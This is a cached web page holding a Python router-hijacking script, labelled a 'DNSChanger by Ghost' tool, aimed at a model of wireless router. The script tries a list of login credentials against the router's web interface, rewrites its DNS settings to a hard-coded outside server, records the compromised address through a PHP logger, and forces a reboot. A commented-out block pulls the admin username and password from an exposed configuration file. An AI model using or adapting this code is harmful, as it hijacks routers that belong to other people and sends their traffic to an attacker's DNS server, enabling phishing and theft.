
<!-- saved from url=(0162)http://webcache.googleusercontent.com/search?q=cache:mVCPN_LSeZsJ:goldenkash.com/application/class/routers_py/router.WirelessNWRN150R.py+&cd=1&hl=en&ct=clnk&gl=us -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!--<base href="http://goldenkash.com/application/class/routers_py/router.WirelessNWRN150R.py">--><base href="."><style>body{margin-left:0;margin-right:0;margin-top:0}#bN015htcoyT__google-cache-hdr{background:#f5f5f5;font:13px arial,sans-serif;text-align:left;color:#202020;border:0;margin:0;border-bottom:1px solid #cecece;line-height:16px;padding:16px 28px 24px 28px}#bN015htcoyT__google-cache-hdr *{display:inline;font:inherit;text-align:inherit;color:inherit;line-height:inherit;background:none;border:0;margin:0;padding:0;letter-spacing:0}#bN015htcoyT__google-cache-hdr a{text-decoration:none;color:#1a0dab}#bN015htcoyT__google-cache-hdr a:hover{text-decoration:underline}#bN015htcoyT__google-cache-hdr a:visited{color:#609}#bN015htcoyT__google-cache-hdr div{display:block;margin-top:4px}#bN015htcoyT__google-cache-hdr b{font-weight:bold;display:inline-block;direction:ltr}</style><style>pre{white-space:pre-wrap}</style></head><body><div id="bN015htcoyT__google-cache-hdr"><div><span>This is Google's cache of <a href="http://goldenkash.com/application/class/routers_py/router.WirelessNWRN150R.py">http://goldenkash.com/application/class/routers_py/router.WirelessNWRN150R.py</a>.</span>&nbsp;<span>It is a snapshot of the page as it appeared on Sep 16, 2018 13:43:29 GMT.</span>&nbsp;<span>The <a href="http://goldenkash.com/application/class/routers_py/router.WirelessNWRN150R.py">current page</a> could have changed in the meantime.</span>&nbsp;<a href="http://support.google.com/websearch/bin/answer.py?hl=en&amp;p=cached&amp;answer=1687222"><span>Learn more</span>.</a></div><span style="display:inline-block;margin-top:8px;color:#717171"><span>Tip: To quickly find your search term on this page, press <b>Ctrl+F</b> or <b>⌘-F</b> (Mac) and use the find bar.</span></span></div><div style="position:relative; margin:8px;"><pre>#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse, requests, md5, base64, os

from scan import password
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(description='Script for DNSChanger by Ghost', prog='Ghost', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=100,width=200))
parser.add_argument("-dns1", "--dns1", help = "Define o dns primário", metavar='', default='192.99.187.193', required=False)
parser.add_argument("-dns2", "--dns2", help = "Define o dns secundário", metavar='', default='8.8.4.4', required=False)
parser.add_argument("-host", "--host", help = "Define o ip e porta do router a ser executado", metavar='', default='a', required=False)

args = parser.parse_args()

dns1 = args.dns1
dns2 = args.dns2
host = args.host.replace("http://","")

router = requests.Session()

# try:
#     headers_exploit = {
#         "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:54.0) Gecko/20100101 Firefox/54.0",
#         "Accept":"*/*",
#         "If-Modified-Since":"1",
#         "Accept-Language":"en-US,en;q=0.5",
#         "Cookie":"admin:language=pt; path=/",
#         "Connection":"keep-alive"
#     }

#     router.get("http://"+host+"/advance.asp", headers=headers_exploit, timeout=5)
#     exploit = router.get("http://"+host+"/cgi-bin/DownloadCfg/RouterCfm.cfg", headers=headers_exploit, timeout=5)

#     R = exploit.content.replace("\r\n","&lt;br&gt;\r\n")

#     user = R.split("http_username=")
#     user = user[1].split("&lt;br&gt;")
#     user = user[0]
#     password = R.split("http_passwd=")
#     password = password[1].split("&lt;br&gt;")
#     password = password[0]

#     if user != "":
#         if password != "":
#             exploitPass = True;
# except Exception as e:
#     exploitPass = False



# if exploitPass:

for x in password.Credentials:

    xx = x.split(":")

    try:
        payload = {'checkEn': 0, 'Username': xx[0], 'Password': xx[1]}
        login = router.post("http://"+host + '/LoginCheck', data=payload, timeout=5)
        if not 'action="/LoginCheck"&gt;' in login.content:
            # print(x+": Login efetuado com sucesso!")
            break;
            # print(x+": Essa merda não logou, mas logava")
    except Exception as e:
        # print(e)
        pass

payload = {'GO': 'wan_dns.asp', 'rebootTag': '', 'DSEN': 1, 'DNSEN': 'on', 'DS1': dns1,'DS2': dns2}
try:
    changeDNS = router.post("http://"+host+'/goform/AdvSetDns',data=payload, timeout=5)
    if dns1 in changeDNS.content:
        # print("DNS localizado com sucesso cara de prikito");
        os.system("cd /var/www/html/logs;php gravar.php "+host)
        # pass
except Exception as e:
    pass
#reiniciar
try:
    router.get("http://"+host+'/goform/SysToolReboot', timeout=5)
except:
    pass</pre></div></body></html>